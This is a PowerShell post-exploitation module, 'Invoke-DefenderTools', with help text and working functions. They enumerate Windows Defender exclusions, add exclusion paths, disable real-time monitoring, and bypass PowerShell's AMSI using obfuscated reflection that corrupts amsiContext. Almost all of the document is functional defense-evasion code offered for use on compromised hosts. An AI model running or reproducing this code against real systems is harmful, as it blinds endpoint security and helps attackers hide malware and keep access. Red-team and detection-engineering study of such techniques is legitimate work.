function Invoke-DefenderTools {
<#
                                          
.SYNOPSIS

Several functions to interact with Windows Defender for post-exploitation.

.PARAMETER help

Shows detailed help for each function.

.PARAMETER list

Shows summary list of available functions.

.PARAMETER GetExcludes

Returns any currently configured files/paths/extensions/process excludes.

.PARAMETER AddExclude

Adds a path exclude.

.PARAMETER DisableRtm

Disables Real-Time Monitoring

.PARAMETER DisableAMSI

Disables Powershell's AMSI Hook

.EXAMPLE

PS> . .\Invoke-DefenderTools

or

PS> Import-Module Invoke-DefenderTools

Functions:

PS> Invoke-DefenderTools -GetExcludes
PS> Invoke-DefenderTools -AddExclude -Path C:\windows\temp
PS> Invoke-DefenderTools -DisableRtm
PS> Invoke-DefenderTools -DisableAmsi

#>
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$List,
	[Switch]$GetExcludes,
	[Switch]$AddExclude,
	[string]$Path,
	[Switch]$DisableRtm,
	[Switch]$DisableAmsi
)

	if ($Help -eq $True) {
		Write @"
		
 ### HELP ###
 ---------------------
 
 Invoke-DefenderTools [-command] [-parameter(s)]
 Invoke-DefenderTools [-list]
 
 Available Invoke-DefenderTools Commands:
 ----------------------------------------
 /----------------------------------------------------------------------/
 | -GetExcludes                                                         |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Gets any current exclude files/paths/extensions    |
 |      currently configured in Windows Defender via the Registry.      |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -GetExcludes                        |
 /----------------------------------------------------------------------/
	   
 /----------------------------------------------------------------------/
 | -AddExclude [-Path] path                                             |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Adds a path exclude to Windows Defender.           |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp           |
 /----------------------------------------------------------------------/
	  
 /----------------------------------------------------------------------/
 | -DisableRTM                                                          |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Disables Windows Defender Real-Time Monitoring.    |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |      Note: Will pop an alert to the end user.                        |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -DisableRtm                         |
 /----------------------------------------------------------------------/
 
 /----------------------------------------------------------------------/
 | -DisableAMSI                                                         |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Disables PowerShell's AMSI Hook                    |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -DisableAmsi                        |
 /----------------------------------------------------------------------/

"@
	}
	elseif ($List -eq $True) {
		Write @"

 Invoke-DefenderTools Command List:
 ----------------------------------
 Invoke-DefenderTools -GetExcludes
 Invoke-DefenderTools -AddExclude [-Path] path
 Invoke-DefenderTools -DisableRtm
 Invoke-DefenderTools -DisableAMSI
 
"@
	}
		
	elseif ($GetExcludes) {
		
		$h = "`n### Invoke-DefenderTools(GetExcludes) ###`n"
		$h
		Write "`nPATHS/FILE EXCLUSIONS"
		Write "---------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*:\*'){
				Write $_.Name
			}
		}
		Write "`nPROCESS EXCLUSIONS"
		Write "------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		Write "`nEXTENSION EXCLUSIONS"
		Write "--------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		$h
	}	
	elseif ($AddExclude -and $Path) {
		$h = "`n### Invoke-DefenderTools(AddExclude) ###`n"
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		
		if ($CheckElevated -eq $true) {
			$h
			Add-MpPreference -ExclusionPath "$path"
			Write " [+] Looks like we're running as admin, added a Defender exclude path of '$path'!"
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to add a Defender exclude."
			$h
		}
	}
	elseif ($DisableRtm) {
		$h = "`n### Invoke-DefenderTools(DisableRtm) ###`n"
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		
		if ($CheckElevated -eq $true) {
			$h
			Set-MpPreference -DisableRealTimeMonitoring $true
			Write " [+] Successfully disabled Defender's real-time monitoring."
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to disable Defender's Real-Time Monitoring."
			$h
		}
	}
	elseif ($DisableAmsi) {
		# https://github.com/jakehomb/AMSI-Exec/blob/master/Invoke-AmsiExec.ps1
		# https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
		$h = "`n### Invoke-DefenderTools(DisableAmsi) ###`n"
		
		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').GetValue($null)))
		
		if ($CheckAmz) {
			$h
			Write " [+] Amsi is already disabled."
			$h
		}
		else {
			
			Try {
			
				$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
			
				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession','NonPublic,Static').SetValue($null,$null)
			
				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext','NonPublic,Static').SetValue($null, [IntPtr]$a)
				
				$h
				Write " [+] Disabled Amsi."
				$h
			}
			Catch {
				$h
				Write " [-] An Error has occurred. Unable to disable Amsi."
				$h
			}
		}
	}
}
